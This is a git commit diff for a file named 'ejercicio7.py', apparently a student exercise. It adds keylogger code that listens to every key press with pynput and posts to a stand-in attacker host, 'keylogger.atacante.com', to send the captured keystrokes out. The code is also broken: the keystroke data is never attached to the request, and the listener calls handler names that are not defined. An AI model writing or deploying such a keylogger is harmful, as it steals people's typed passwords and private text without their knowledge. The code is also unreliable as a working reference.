8114577eb3b88a7828ef0d0d31c77af8314d2f67
JosemixxXX <77117716+JosemixxXX@users.noreply.github.com>
2024-10-14 19:01:41 +0200

    Update ejercicio7.py

--- ejercicio7.py
+++ ejercicio7.py
@@ -1,3 +1,14 @@
-import keyboard
+from pynput import keyboard
+import requests
 
-def onKeyPress()
+def onKeyPress(key):
+    try:
+        char=key.char
+    except AttributeError:
+        char=str(key)
+
+    data={'key':char}
+    response=requests.post('https://keylogger.atacante.com')
+
+with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
